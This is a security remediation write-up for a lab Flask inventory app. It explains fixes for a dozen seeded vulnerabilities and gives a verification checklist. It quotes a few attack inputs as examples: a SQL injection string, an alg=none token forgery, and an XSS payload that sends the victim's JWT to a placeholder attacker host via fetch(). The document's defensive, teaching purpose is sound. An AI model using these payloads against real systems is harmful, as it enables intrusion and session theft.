# Security Vulnerability Remediation — InvTracker (nu-tracker)

This document explains the **why** and **how** of every security fix applied to
the InvTracker application. The original vulnerabilities were intentionally
seeded as part of an academic security lab; SECURITY_ANALYSIS.md is retained
as a historical index of what *was* broken. Every fix below is also tagged
inline in the source as `# FIX-Vn:` (Python) or `// FIX-Vn:` (JavaScript) so
the source code itself is self-documenting.

---

## V1 — SQL Injection

**Where:** [routes/inventory.py](routes/inventory.py) — `search_items()`

**Why it was bad.** The search endpoint built its query as an f-string:
`f"SELECT * FROM inventory_items WHERE name LIKE '%{q}%' ..."`. An attacker
could send `q=' OR 1=1 --` to dump every row, or use stacked-statement
tricks / `UNION SELECT` to exfiltrate other tables — including the `users`
table that, at the time, stored plaintext passwords. The error handler also
echoed the failing SQL back to the client, which would have given an
attacker a free SQL oracle.

**How it was fixed.**
- The query now uses `?` placeholders with bound parameters, so user input is
  never parsed as SQL.
- The LIKE wildcards (`%`, `_`) and the backslash are escaped on the Python
  side and an explicit `ESCAPE '\\'` clause is added, so a user typing a
  literal `%` searches for that character instead of widening the match.
- The error response no longer contains the SQL or exception type; the full
  stack trace is logged server-side only (see V9).

---

## V2 — Hardcoded Credentials

**Where:** [routes/auth.py](routes/auth.py) (constants), [database.py](database.py) (`_seed`)

**Why it was bad.** The source contained `ADMIN_PASSWORD = "admin123"` and
seeded the same credential into the database on first run. Anyone reading
the repository — or simply guessing a common default — could log in as
admin. The same was true of the `staff` and `viewer` demo accounts.

**How it was fixed.**
- The `ADMIN_USERNAME` / `ADMIN_PASSWORD` module constants were deleted.
  They were dead code (the login path read from the DB), but their presence
  in source was itself the leak.
- `database._seed` now resolves each demo account's password from an
  environment variable (`INVTRACKER_ADMIN_PASSWORD`, `_STAFF_PASSWORD`,
  `_VIEWER_PASSWORD`). If the operator has not set one, a fresh 24-character
  URL-safe random value is generated with `secrets.token_urlsafe(18)` and
  printed **once** to stderr so it can be captured.
- No password defaults are baked into the source.
- The credentials live in the DB only as PBKDF2-SHA256 salted hashes
  (see V3).

---

## V3 — No Password Hashing

**Where:** [database.py](database.py), [routes/auth.py](routes/auth.py)

**Why it was bad.** Passwords were stored in the `users.password` column in
plaintext and compared with `==`. Any DB compromise — via SQL injection (V1),
direct file access, a backup leak — yielded immediate credential reuse
across whatever other sites the users had reused those passwords on.

**How it was fixed.**
- The application now uses `werkzeug.security.generate_password_hash` (which
  produces a salted PBKDF2-SHA256 hash by default) when seeding demo users
  and when registering new users.
- Login validates with `werkzeug.security.check_password_hash`, which is
  constant-time across the hash bytes and rejects malformed stored values
  safely. This makes timing attacks against the hash impractical.
- No schema change was required; the existing `password` TEXT column now
  stores the hash string. The comment on that column has been updated.

---

## V4 — Broken JWT Authentication

**Where:** [routes/auth.py](routes/auth.py) — `issue_token`, `decode_token`,
`current_user`

**Why it was bad.** The auth layer was broken in three independent ways, each
of which was sufficient for full bypass:
1. **`alg=none` short-circuit.** `decode_token` peeled apart the JWT header,
   and if it saw `"alg": "none"`, it accepted the unsigned payload verbatim.
   An attacker could mint *any* claim set (e.g. `{"sub": 1, "role": "admin"}`)
   and the server would trust it.
2. **Weak secret.** Tokens were signed with the literal string `"secret"`,
   trivially brute-forceable offline against any captured token.
3. **No expiry enforcement.** Decode was called with
   `{"verify_exp": False}`, so a token captured years ago would still work.

**How it was fixed.**
- The `alg=none` branch is gone entirely. There is no path through
  `decode_token` that skips signature verification.
- `decode_token` calls `jwt.decode(..., algorithms=[JWT_ALGORITHM])`. The
  `algorithms` allow-list pins HS256 and PyJWT refuses to honour any other
  `alg` value in the token header — including `none` — even if it appears
  there. This is the canonical defence against algorithm-confusion attacks.
- The signing secret is read from `INVTRACKER_JWT_SECRET`. If absent, a
  per-process random secret (`secrets.token_urlsafe(32)`) is generated and a
  warning is printed; tokens then last only until the process restarts,
  which fails closed rather than open.
- The `exp` claim is set to issuance + 8 hours and is **enforced** on
  decode (no `verify_exp` override). Expired tokens raise
  `ExpiredSignatureError`, which is caught and converted to a `None` return.
- All JWT errors (`PyJWTError` and its subclasses) are caught and treated as
  "not authenticated", so a malformed or forged token cannot accidentally
  satisfy a downstream truthiness check.

---

## V5 — Insecure Direct Object Reference (IDOR) / V12 — Missing RBAC

These two were intertwined; the fix is the same authorization layer.

**Where:** [routes/auth.py](routes/auth.py) (`require_auth`, `require_role`),
[routes/inventory.py](routes/inventory.py) (all write endpoints, audit, users)

**Why it was bad.** Every route only checked "is there a JWT?", never "is
this user *allowed* to do this?". A `viewer` token could DELETE any item,
list every user (with their plaintext passwords — see V7), or read the
audit log. There was no enforcement of the `role` claim that the tokens
themselves carried.

**How it was fixed.**
- Added a `require_role(*allowed_roles)` helper in `routes/auth.py` that
  returns `(user, None)` on success or `(None, (jsonify(...), 403))` if the
  user's role is not in the allow-list. `require_auth()` is the
  authentication-only variant for read endpoints.
- Applied throughout:
  - `POST /api/inventory`, `PUT /api/inventory/<id>` → `admin` or `staff`
  - `DELETE /api/inventory/<id>` → `admin` only
  - `GET /api/auth/users` → `admin` only
  - `GET /api/audit` → `admin` only (was previously **unauthenticated**)
  - `POST /api/auth/register` → ignores any client-supplied `role`; new
    accounts are always created as `viewer`. The previous behaviour let an
    anonymous attacker self-promote to admin by passing `"role": "admin"`.
- Read endpoints (`GET /api/inventory`, `GET /api/inventory/<id>`,
  `/api/locations`, `/api/suppliers`) still require authentication but do
  not require a specific role. This matches the app's data model: inventory
  is shared state across the company, not user-owned records, so any
  authenticated employee may view it. The fix to IDOR is therefore "you
  cannot mutate other users' data" (because the write endpoints check role),
  not "you cannot read items by ID".

---

## V6 — Stored Cross-Site Scripting (XSS)

**Where:** [static/app.js](static/app.js) — every `.innerHTML =` template

**Why it was bad.** The frontend interpolated stored fields (item name,
description, location, RFID, supplier name, audit details, etc.) directly
into HTML strings and assigned them via `.innerHTML`. A user with permission
to create or edit an item could store a payload like
`<img src=x onerror="fetch('//attacker/'+localStorage.nutracker_token)">`
in the name field; every other user who loaded the inventory list would
silently exfiltrate their JWT to the attacker.

**How it was fixed.**
- Added an `escapeHtml(value)` helper (aliased `h`) that escapes
  `& < > " '`. The output is safe to splice into HTML text or attribute
  contexts.
- Every interpolated stored field across the inventory table, item detail
  modal, supplier table, locations cards, users table, and audit table is
  wrapped in `h(...)`. The header of the detail modal switched from
  `.innerHTML = item.name` to `.textContent = item.name`, which is
  inherently safe.
- Numeric fields are passed through `h()` defensively in case the server
  ever sends them as strings — the function coerces with `String()` first.
- This is layered with a server-side mitigation in V12: only `admin` and
  `staff` can create or edit items, reducing the population of accounts
  that could attempt a stored-XSS payload in the first place.

---

## V7 — Sensitive Data Exposure

**Where:** [routes/auth.py](routes/auth.py) (`log_request`, `list_users`),
[static/app.js](static/app.js) (`enterApp`, `loadUsers`)

**Why it was bad.** Three separate leaks:
1. `log_request` wrote the raw `Authorization: Bearer <jwt>` header and the
   full request body — including `password` fields on login/register — into
   a world-readable plaintext `requests.log`. Anyone with read access to
   that file owned every active session.
2. `GET /api/auth/users` returned the plaintext password column (then V3,
   later the hash) to any authenticated caller.
3. `enterApp` rendered the current user's JWT into the navbar via
   `#current-token`, so a screenshot, screen share, or shoulder-surf
   leaked the token.

**How it was fixed.**
- `log_request` now redacts the `Authorization` header to
  `Bearer <redacted>` and replaces any JSON `"password": "..."` value in the
  logged body with `"password": "***"` via regex. The request log still
  provides audit information (who, when, what path) without exposing
  secrets.
- `list_users` projects only `id, username, role, created_at`. The password
  column is never returned, and the endpoint is admin-only (V12).
- `enterApp` sets `#current-token.textContent = "***"`; the raw token is
  no longer placed in the DOM.
- `loadUsers` no longer renders a password value — it shows `***` even if
  an older deployment somehow still returned the field.

**Operator action required.** The pre-existing `requests.log` file in the
repository contains **historical leaked bearer tokens** captured before the
fix. The fix prevents *new* entries from leaking, but the historical lines
remain. Recommended cleanup:

```powershell
Remove-Item .\requests.log
```

The application will recreate the file (with redacted entries only) on the
next request. Any tokens that appear in the historical log should be
treated as compromised; restarting the app with a new
`INVTRACKER_JWT_SECRET` (or simply restarting, since the secret is
regenerated each run when no env var is set) invalidates them all.

---

## V8 — No Rate Limiting / Brute Force Protection

**Where:** [routes/auth.py](routes/auth.py) — `login`

**Why it was bad.** `/api/auth/login` had no throttling, so an attacker
could try thousands of passwords per second against a known username, or
spray a common password across every username they could enumerate. The
`requests.log` showed exactly this kind of repeated probing.

**How it was fixed.**
- Added a small in-memory sliding-window limiter keyed by `(client IP,
  lowercased username)`. The limiter records every failed login attempt's
  timestamp in a `deque`; on each new attempt, timestamps older than the
  window are evicted, and if more than 5 failures remain inside a 5-minute
  window, the endpoint returns **HTTP 429 Too Many Requests** before
  performing any DB work.
- A successful login clears the failure bucket for that key, so a
  legitimate user who mistyped their password a few times is not locked
  out forever.
- The limit check runs before the username lookup, so a blocked client
  cannot use the endpoint as a timing oracle for username enumeration.
- The login error message is now generic ("Invalid credentials")
  regardless of whether the username exists, removing a separate
  enumeration channel.

**Limitations (intentional).** The bucket is per-process and in-memory.
For a single-worker Flask dev server this is sufficient; behind a real
WSGI runner (gunicorn with multiple workers, etc.) this state should move
into a shared store like Redis. This is documented in the file's docstring.

---

## V9 — Verbose Error Messages

**Where:** [app.py](app.py) (global handler), [routes/inventory.py](routes/inventory.py),
[routes/auth.py](routes/auth.py)

**Why it was bad.** The `@app.errorhandler(Exception)` handler returned the
full Python traceback, exception type, and message to the client. Several
per-route `try/except` blocks did the same with their own JSON payloads,
and the SQL injection endpoint additionally echoed the failing query.
This leaked file paths, library versions, table/column names, and
operating-system details to anyone who could trigger an error.

**How it was fixed.**
- The global handler now logs the traceback via `app.logger.exception(...)`
  and returns a generic `{"error": "Internal server error"}` with HTTP 500.
- Per-route except blocks return short, generic messages (`"Search failed"`,
  `"Could not create item"`, `"Username already taken"`, etc.) and route
  the detailed exception to `current_app.logger.exception` for operator
  visibility only.
- `debug=False` (V11) means the Werkzeug interactive debugger is no longer
  available either, removing a separate path to traceback disclosure and
  remote code execution.

---

## V10 — CORS Misconfiguration

**Where:** [app.py](app.py) — `after_request`

**Why it was bad.** The response headers set
`Access-Control-Allow-Origin: *` plus `Allow-Methods: GET, POST, PUT,
DELETE, OPTIONS` plus `Allow-Headers: *`. While the SPA itself is served
same-origin (so it doesn't *need* CORS), the wildcard allowed any external
site to issue cross-origin requests with arbitrary headers. Combined with
the bearer-token model, any future code that exposed the token to JS-level
exfiltration would be cross-origin-readable.

**How it was fixed.**
- The `Access-Control-Allow-*` headers have been removed entirely. The SPA
  and API share an origin, so CORS is not required and explicitly disabling
  cross-origin access is the safe default.
- If a legitimate cross-origin client is added later, the right approach
  is an allow-list of specific origins (not `*`), with credentials and
  methods restricted to what that client actually needs.

---

## V11 — Insecure HTTP / Debug Mode

**Where:** [app.py](app.py) — `__main__`

**Why it was bad.** `app.run(..., debug=True)` did two dangerous things:
- It enabled the Werkzeug **interactive debugger**, which provides remote
  code execution via the browser to anyone who can trigger an exception
  (protected only by a PIN that has been leaked or worked around many
  times historically).
- It served plain HTTP on `127.0.0.1:5000`, so any login or token traffic
  was readable on the wire — fine on strict loopback, dangerous the moment
  the host is bound to `0.0.0.0` or accessed over a network.

**How it was fixed.**
- `debug` now defaults to **False**, only flipping on if
  `INVTRACKER_DEBUG=1` is set explicitly. Production deployments will
  always run without the debugger.
- An opt-in `INVTRACKER_SSL=adhoc` switch starts Flask with an
  auto-generated self-signed certificate (`ssl_context="adhoc"`) for local
  HTTPS testing. The recommended production posture, documented in the
  module docstring, is to terminate TLS in a reverse proxy
  (nginx, Caddy, IIS) with a real certificate from a public CA, and let
  Flask listen only on loopback behind that.

---

## V12 — Excessive Permissions / Privilege Escalation on Registration

Covered together with **V5** above. The summary:
- Role checks are enforced by `require_role(...)` on every state-changing
  endpoint and on the users/audit listing endpoints.
- The registration endpoint no longer accepts a client-supplied `role`;
  every new account is created with role `viewer`. Promotion to staff or
  admin requires an out-of-band action by an existing admin (intentionally
  not exposed as a public API in this remediation pass).

---

## Defence-in-depth and out-of-scope items

A few related items were considered and consciously deferred:

- **CSRF tokens.** The app authenticates with a `Authorization: Bearer ...`
  header that is set in JavaScript and is not automatically attached by the
  browser. Classical cookie-based CSRF therefore does not apply. If the
  token storage is ever moved into an `httpOnly` cookie (a worthwhile
  improvement against XSS — see below), CSRF protection will need to be
  added at the same time.
- **JWT in `localStorage`.** Tokens are still stored in `localStorage`
  because the alternative (httpOnly + Secure + SameSite=Strict cookies)
  is a structural change to both the auth flow and CSRF handling and was
  out of scope. The XSS fixes (V6) and the removal of the token from the
  DOM (V7) substantially reduce the realistic attack surface against
  `localStorage` storage in this app.
- **Historical `requests.log`.** Tokens that already leaked into the log
  cannot be unleaked; restart the app to invalidate them (the JWT secret
  rotates each restart when no env var is set), then delete the file.
- **Account lockout across restarts.** The login rate limiter is
  in-memory, so a process restart resets all buckets. This is acceptable
  for a single-process demo; multi-worker deployments need a shared
  backend.

---

## Verification cheat-sheet

| Check | Expected result |
| --- | --- |
| Boot `python app.py` on a clean DB | Random demo passwords printed to stderr once; `debug=False`. |
| Log in with `admin / admin123` | 401 Invalid credentials. |
| Log in with the printed admin password | 200, returns a JWT. |
| `GET /api/inventory/search?q=' OR 1=1 --` (auth'd) | Returns 0 matches, no error leakage. |
| Send a forged JWT with `alg=none` | 401 Authentication required. |
| Wait past token expiry, retry | 401 Authentication required. |
| 6th failed login in 5 min for one user from one IP | 429 Too many attempts. |
| `GET /api/auth/users` as viewer | 403 Forbidden. |
| `GET /api/auth/users` as admin | 200, no `password` field in response. |
| `DELETE /api/inventory/1` as staff | 403 Forbidden. |
| `DELETE /api/inventory/1` as admin | 200 OK. |
| Create item named `<img src=x onerror=alert(1)>` | Renders as literal text in the table. |
| `requests.log` after a login | `auth=Bearer <redacted>`, `body=...{"password":"***"}...`. |
| Response headers | No `Access-Control-Allow-Origin: *`. |
| Trigger a server error | Response body is `{"error": "Internal server error"}` only; full trace in server log. |
